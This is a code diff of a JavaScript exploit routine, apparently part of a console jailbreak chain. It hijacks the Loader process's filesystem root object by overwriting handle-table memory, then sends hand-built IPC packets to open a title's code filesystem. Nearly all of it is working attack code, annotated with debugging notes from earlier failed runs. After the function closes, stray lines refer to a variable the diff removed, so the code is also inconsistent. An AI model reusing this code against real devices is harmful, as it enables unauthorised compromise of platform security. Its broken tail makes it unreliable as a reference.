@@ -25,93 +25,80 @@ export async function instantSendProbe(context, title) {
     check(owned && target && context.loaderCopy && ep && ep.armed,
         "instant-send requires the loader-copy state");
 
-    const entry20 = context.loaderCopy.ownEntry + 0x20;
-    // (entry20 kept for reference; the own-entry copy needs no staging)
     const slots = arenaSlots(context);
     const info = arenaAlloc(context, 0x2000, "is-info");
-    buildCmif(slots.pkt, {cmd: 0,
-        input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
-        b: [{addr: info + 32n, size: 0x1a4}]});
 
-    // The reference copies ITS OWN pid-initialized, promoted root through
-    // its inspection domain (app/domain.cjs openDomain: fresh fsp-srv ->
-    // cmd1+{pid:true} init -> ConvertToDomain; domain-copy then copies the
-    // OWN object). Borrowing the LOADER's object instead binds the copy to
-    // the Loader's process — every pid-touching command (init, code-open)
-    // mismatches the requester and the server kills the session (runs
-    // 48-61). The borrow was the fatal substitute all along: copy our own
-    // entry, no borrow, no restore.
-    let copyHandle = 0;
+    // v10 — the decoded native path (5T5Brx launch record): the code-open
+    // is a TYPE-6 RequestWithContext sent ON THE INSPECTION DOMAIN SESSION,
+    // routed to the target object THROUGH THE CONTEXT HEADER — its second
+    // word is the DOMAIN OBJECT ID (their record: requests object:9 = the
+    // loader-root entry; the reply's moved handle became object 148 and the
+    // next request's context said 148). The plain CopyFromCurrentDomain
+    // handle was never used for the code-open; our port sending it there is
+    // what killed every copy since run 1.
+    const entry20 = context.loaderCopy.ownEntry + 0x20;
+    await readFs(context, entry20, 8);                 // warm the pointer
+    const oldPair = await readFs(context, entry20, 0x10);
+    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
     try {
-        const reply = cmifSend(owned.handle, {pkt: slots.pkt,
-            control: true, cmd: 1,
-            input: [owned.root & 0xff, owned.root >> 8 & 0xff,
-                owned.root >> 16 & 0xff, owned.root >> 24 & 0xff],
-            rawWords: 9});
-        const copyRc = reply.transport;
-        if (copyRc === 0 && reply.moves && reply.moves.length)
-            copyHandle = track(context, reply.moves[0], "is-copy");
-        await khLog("IS1 copy-own rc=" + hex(copyRc) +
-            " handle=" + hex(copyHandle));
-        if (copyHandle) {
-            // Our inspection domain was never pid-initialized (the
-            // reference's openDomain sends cmd1+{pid:true} BEFORE
-            // ConvertToDomain) — so the copy inherits no binding. Init the
-            // copy for real: cmd 1, u64(0), pid descriptor. On our OWN
-            // root this binds the session to us (run61's kill was the
-            // Loader-object binding mismatch).
-            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0n), pid: true});
-            const init = bareSendTransport(copyHandle, slots.pkt2);
-            let initR = "-";
-            if (init === 0) initR = hex(cmifReply(slots.pkt2).result);
-            // The reference's working code-open (5T5Brx launch record,
-            // steps[].request) is a TYPE 6 RequestWithContext: w0=6|counts,
-            // B-descriptor, 4-word context {token 0x00X00001, pid, 0, 0},
-            // then SFCI + version(1) + cmd + input. Type 4 code-opens kill
-            // the session; the SDK speaks WithContext natively.
-            const pkt = slots.pkt;
-            for (let i = 0n; i < 0x100n; i += 8n)
-                runtime.write64(pkt + i, 0n);
-            runtime.write32(pkt, BigInt((0x6 | (1 << 24)) >>> 0));   // type 6, 1 B
-            runtime.write32(pkt + 4n, 0x10n);                          // 16 words
-            const infoAddr = BigInt(info);
-            runtime.write32(pkt + 8n, 0x1a4n);                         // B size
-            runtime.write32(pkt + 12n,
-                BigInt(Number(infoAddr & 0xffffffffn)));
-            const bflags = (((infoAddr >> 32n) & 0xfn) << 28n) |
-                (((infoAddr >> 36n) & 7n) << 2n);                      // mode 0
-            runtime.write32(pkt + 16n, BigInt(Number(bflags)));
-            runtime.write32(pkt + 0x20n, 0x00200001n);                 // context token
-            runtime.write32(pkt + 0x24n, 9n);                          // pid 9
-            runtime.write32(pkt + 0x28n, 0n);
-            runtime.write32(pkt + 0x2cn, 0n);
-            runtime.write32(pkt + 0x30n, 0x49434653n);                 // SFCI
-            runtime.write32(pkt + 0x34n, 1n);                          // version
-            runtime.write32(pkt + 0x38n, 0n);                          // cmd 0
-            runtime.write32(pkt + 0x3cn, 0n);
-            runtime.write32(pkt + 0x40n, 0x0301n);                     // attrs 1, storage 3
-            runtime.write32(pkt + 0x44n, 0n);
-            runtime.write64(pkt + 0x48n, BigInt(title));
-            const t2 = bareSendTransport(copyHandle, pkt);
-            let d2 = "-", parsed = null;
-            if (t2 !== 0) {
-                d2 = hex(Number(sendIPC(copyHandle, pkt)) >>> 0);
-            } else parsed = cmifReply(pkt);
-            await khLog("IS2 init=" + hex(init) + "/" + initR +
-                " code-open(t6)=" + hex(t2) + " disp=" + d2 +
-                (parsed ? " result=" + hex(parsed.result) +
-                    " moves=" + (parsed.moves ? parsed.moves.length : 0) : ""));
-            if (parsed && parsed.result === 0 && parsed.moves &&
-                    parsed.moves.length) {
-                context.instantCodeFs = track(context, parsed.moves[0],
-                    "is-codefs");
+        await writeFs(context, entry20, borrowPair);   // route our entry at the loader root
+        const pkt = slots.pkt;
+        for (let i = 0n; i < 0x100n; i += 8n)
+            runtime.write64(pkt + i, 0n);
+        runtime.write32(pkt, BigInt((0x6 | (1 << 24)) >>> 0));   // type 6, 1 B
+        runtime.write32(pkt + 4n, 0x10n);                          // 16 words
+        const infoAddr = BigInt(info);
+        runtime.write32(pkt + 8n, 0x1a4n);                         // B size
+        runtime.write32(pkt + 12n,
+            BigInt(Number(infoAddr & 0xffffffffn)));
+        const bflags = (((infoAddr >> 32n) & 0xfn) << 28n) |
+            (((infoAddr >> 36n) & 7n) << 2n);                      // mode 0
+        runtime.write32(pkt + 16n, BigInt(Number(bflags)));
+        runtime.write32(pkt + 0x20n, 0x00200001n);                 // context slot token
+        runtime.write32(pkt + 0x24n, BigInt(owned.root));          // DOMAIN OBJECT ID
+        runtime.write32(pkt + 0x28n, 0n);
+        runtime.write32(pkt + 0x2cn, 0n);
+        runtime.write32(pkt + 0x30n, 0x49434653n);                 // SFCI
+        runtime.write32(pkt + 0x34n, 1n);                          // version
+        runtime.write32(pkt + 0x38n, 0n);                          // cmd 0
+        runtime.write32(pkt + 0x3cn, 0n);
+        runtime.write32(pkt + 0x40n, 0x0301n);                     // attrs 1, storage 3
+        runtime.write32(pkt + 0x44n, 0n);
+        runtime.write64(pkt + 0x48n, BigInt(title));
+        const t = bareSendTransport(owned.handle, pkt);
+        const words = [];
+        for (let i = 0n; i < 16n; i++)
+            words.push(hex(Number(runtime.read32(pkt + i * 4n))));
+        await khLog("IS1 domain code-open(t6) rc=" + hex(t) +
+            " reply=[" + words.join(" ") + "]");
+        if (t === 0) {
+            // Type-6 reply: SFCO, result, payload {.., handle, ..}; scan
+            // the first words for the result and a handle-shaped value.
+            let result = -1, handle = 0;
+            for (let i = 0n; i < 16n; i++) {
+                const w = Number(runtime.read32(pkt + i * 4n));
+                if (w === 0x4f464353 && i + 1n < 16n)
+                    result = Number(runtime.read32(pkt + (i + 1n) * 4n));
+            }
+            for (let i = 2n; i < 15n; i++) {
+                const w = runtime.read32(pkt + i * 4n);
+                if (w > 0x10000000n && w < 0xffff8000n) handle = Number(w);
+            }
+            await khLog("IS2 result=" + hex(result >>> 0) +
+                " handle?=" + hex(handle));
+            if ((result >>> 0) === 0 && handle)
+                context.instantCodeFs = track(context, handle, "is-codefs");
+            if (context.instantCodeFs)
                 await khLog("IS3 ***CODE FS OPEN*** handle=" +
                     hex(context.instantCodeFs));
-            }
         }
     } finally {
-        // No borrow was taken — nothing to restore.
+        await writeFs(context, entry20, oldPair);      // un-borrow
     }
+    // Retain the copied root when the code-open lived (the reference keeps
+    // its copied roots for later code-opens); close only the dead ones.
+    return {ok: true};
+}
     // Retain the copied root when the code-open lived (the reference keeps
     // its copied roots for later code-opens); close only the dead ones.
     if (copyHandle && !context.instantCodeFs)
